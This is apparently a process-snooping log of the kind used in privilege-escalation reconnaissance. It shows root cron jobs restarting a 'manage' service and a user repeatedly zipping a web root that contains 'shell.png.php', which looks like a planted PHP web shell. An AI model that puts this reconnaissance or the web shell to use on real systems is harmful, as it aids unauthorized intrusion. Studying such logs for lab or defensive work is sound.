+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13435  | cut -d  -f4 [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13434  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13433  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:26:09 [34;1mCMD: UID=0     PID=13432  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13443  | systemd-detect-virt -q -c [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13442  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13444  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13445  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13447  | /usr/bin/dpkg --print-foreign-architectures [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13446  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13448  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13450  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13452  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13453  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13455  | id -u [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13457  | [0m
+2025/01/16 12:26:11 [34;1mCMD: UID=0     PID=13456  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13458  | cat /var/lib/update-notifier/hwe-eol [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13462  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13461  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13460  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13468  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13467  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13464  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13469  | [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13470  | [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13472  | sshd: root@pts/2     [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13476  | [0m
+2025/01/16 12:26:12 [34;1mCMD: UID=0     PID=13477  | -bash [0m
+2025/01/16 12:26:13 [36;1mCMD: UID=???   PID=13478  | ???[0m
+2025/01/16 12:26:13 [34;1mCMD: UID=0     PID=13483  | su - orville [0m
+2025/01/16 12:26:13 [32;1mCMD: UID=1003  PID=13486  | /usr/bin/locale-check C.UTF-8 [0m
+2025/01/16 12:26:13 [32;1mCMD: UID=1003  PID=13484  | -bash [0m
+2025/01/16 12:26:13 [32;1mCMD: UID=1003  PID=13489  | -bash [0m
+2025/01/16 12:26:13 [32;1mCMD: UID=1003  PID=13490  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:26:15 [32;1mCMD: UID=1003  PID=13494  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:26:20 [32;1mCMD: UID=1003  PID=13495  | [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13496  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13505  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13504  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13503  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13502  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13501  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13500  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13499  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13498  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:27 [34;1mCMD: UID=0     PID=13497  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13510  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13509  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13508  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13507  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13506  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13511  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13512  | [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13516  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13515  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13514  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:26:38 [34;1mCMD: UID=0     PID=13513  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13517  | /usr/sbin/CRON -f [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13519  | systemctl restart manage [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13518  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13520  | /sbin/init [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13524  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13523  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13522  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13521  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:01 [34;1mCMD: UID=0     PID=13525  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:05 [34;1mCMD: UID=0     PID=13526  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:27:05 [34;1mCMD: UID=109   PID=13529  | sshd: [net]          [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13530  | /sbin/init [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13535  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13534  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13533  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13532  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13531  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:06 [34;1mCMD: UID=0     PID=13536  | (systemd) [0m
+2025/01/16 12:27:07 [34;1mCMD: UID=0     PID=13537  | (sd-pam) [0m
+2025/01/16 12:27:07 [34;1mCMD: UID=0     PID=13539  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:27:07 [34;1mCMD: UID=0     PID=13538  | (sd-executor) [0m
+2025/01/16 12:27:08 [34;1mCMD: UID=0     PID=13541  | /bin/systemctl --user set-environment DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13559  | cut -c -80 [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13558  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13557  | [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13556  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13555  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13543  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13542  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13572  | cut -d  -f4 [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13571  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13570  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:27:09 [34;1mCMD: UID=0     PID=13569  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13573  | id -u [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13574  | date +%s [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13575  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13577  | [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13578  | [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13581  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13579  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:27:10 [34;1mCMD: UID=0     PID=13582  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13583  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13584  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13585  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13586  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13587  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13588  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13589  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:27:11 [34;1mCMD: UID=0     PID=13590  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13591  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13594  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13593  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13597  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13602  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13601  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13608  | /bin/sh /etc/update-motd.d/98-reboot-required [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13609  | sshd: root@pts/2     [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13613  | -bash [0m
+2025/01/16 12:27:12 [34;1mCMD: UID=0     PID=13612  | locale [0m
+2025/01/16 12:27:13 [34;1mCMD: UID=0     PID=13614  | -bash [0m
+2025/01/16 12:27:13 [34;1mCMD: UID=0     PID=13618  | dircolors -b [0m
+2025/01/16 12:27:13 [34;1mCMD: UID=0     PID=13619  | [0m
+2025/01/16 12:27:13 [34;1mCMD: UID=0     PID=13620  | -bash [0m
+2025/01/16 12:27:13 [32;1mCMD: UID=1003  PID=13623  | -bash [0m
+2025/01/16 12:27:13 [32;1mCMD: UID=1003  PID=13621  | -bash [0m
+2025/01/16 12:27:14 [32;1mCMD: UID=1003  PID=13626  | -bash [0m
+2025/01/16 12:27:14 [32;1mCMD: UID=1003  PID=13630  | dircolors -b [0m
+2025/01/16 12:27:15 [32;1mCMD: UID=1003  PID=13631  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:27:20 [32;1mCMD: UID=1003  PID=13632  | [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13633  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13634  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13635  | [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13641  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13640  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13639  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13638  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13637  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13636  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13642  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:28 [34;1mCMD: UID=0     PID=13643  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13654  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13653  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13652  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13651  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13650  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13649  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13648  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13647  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13646  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13645  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:27:38 [34;1mCMD: UID=0     PID=13644  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:01 [34;1mCMD: UID=0     PID=13655  | /usr/sbin/CRON -f [0m
+2025/01/16 12:28:01 [34;1mCMD: UID=0     PID=13657  | systemctl restart manage [0m
+2025/01/16 12:28:01 [34;1mCMD: UID=0     PID=13656  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:28:01 [34;1mCMD: UID=0     PID=13658  | /sbin/init [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13667  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13666  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13665  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13664  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13663  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13662  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13661  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13660  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:02 [34;1mCMD: UID=0     PID=13659  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:05 [34;1mCMD: UID=0     PID=13668  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:28:06 [34;1mCMD: UID=109   PID=13671  | sshd: [net]          [0m
+2025/01/16 12:28:06 [34;1mCMD: UID=0     PID=13672  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:28:07 [34;1mCMD: UID=0     PID=13673  | (systemd) [0m
+2025/01/16 12:28:07 [34;1mCMD: UID=0     PID=13674  | (sd-pam) [0m
+2025/01/16 12:28:08 [34;1mCMD: UID=0     PID=13675  | (sd-executor) [0m
+2025/01/16 12:28:08 [34;1mCMD: UID=0     PID=13676  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:28:08 [34;1mCMD: UID=0     PID=13677  | [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13678  | (ystemctl) [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13679  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13681  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13680  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13682  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:28:09 [34;1mCMD: UID=0     PID=13683  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13697  | cut -c -80 [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13696  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13695  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13694  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13693  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13706  | /bin/sh /etc/update-motd.d/91-contract-ua-esm-status [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13710  | cut -d  -f4 [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13709  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13708  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:28:10 [34;1mCMD: UID=0     PID=13707  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13712  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13717  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13718  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13719  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13720  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:28:11 [34;1mCMD: UID=0     PID=13721  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13722  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13723  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13724  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13725  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13727  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13728  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13729  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13738  | sort -r [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13737  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13736  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:28:12 [34;1mCMD: UID=0     PID=13735  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13740  | id -u [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13739  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13741  | [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13743  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13742  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13744  | [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13745  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13751  | -bash [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13747  | -bash [0m
+2025/01/16 12:28:13 [34;1mCMD: UID=0     PID=13752  | -bash [0m
+2025/01/16 12:28:14 [34;1mCMD: UID=0     PID=13755  | dirname /usr/bin/lesspipe [0m
+2025/01/16 12:28:14 [34;1mCMD: UID=0     PID=13754  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:28:14 [34;1mCMD: UID=0     PID=13756  | -bash [0m
+2025/01/16 12:28:14 [34;1mCMD: UID=0     PID=13758  | su - orville [0m
+2025/01/16 12:28:14 [32;1mCMD: UID=1003  PID=13759  | -bash [0m
+2025/01/16 12:28:14 [32;1mCMD: UID=1003  PID=13760  | -bash [0m
+2025/01/16 12:28:14 [32;1mCMD: UID=1003  PID=13764  | -bash [0m
+2025/01/16 12:28:15 [32;1mCMD: UID=1003  PID=13768  | dircolors -b [0m
+2025/01/16 12:28:16 [32;1mCMD: UID=1003  PID=13769  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:28:28 [34;1mCMD: UID=0     PID=13771  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:28 [34;1mCMD: UID=0     PID=13775  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:28 [34;1mCMD: UID=0     PID=13774  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:28 [34;1mCMD: UID=0     PID=13773  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:28 [34;1mCMD: UID=0     PID=13772  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:29 [34;1mCMD: UID=0     PID=13776  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:29 [34;1mCMD: UID=0     PID=13780  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:29 [34;1mCMD: UID=0     PID=13779  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:29 [34;1mCMD: UID=0     PID=13778  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:29 [34;1mCMD: UID=0     PID=13777  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13790  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13789  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13788  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13787  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13786  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13785  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13784  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13783  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13782  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13781  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:28:39 [34;1mCMD: UID=0     PID=13791  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:29:01 [34;1mCMD: UID=0     PID=13792  | /usr/sbin/CRON -f [0m
+2025/01/16 12:29:01 [34;1mCMD: UID=0     PID=13793  | /usr/sbin/CRON -f [0m
+2025/01/16 12:29:01 [34;1mCMD: UID=0     PID=13794  | systemctl restart manage [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13795  | /sbin/init [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13796  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13797  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13802  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13801  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13800  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13799  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13798  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:02 [34;1mCMD: UID=0     PID=13803  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:06 [34;1mCMD: UID=0     PID=13805  | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m
+2025/01/16 12:29:06 [34;1mCMD: UID=0     PID=13804  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:06 [34;1mCMD: UID=109   PID=13808  | sshd: [net]          [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13818  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13817  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13816  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13815  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13814  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:29:07 [34;1mCMD: UID=0     PID=13813  | /lib/systemd/systemd-udevd [0m
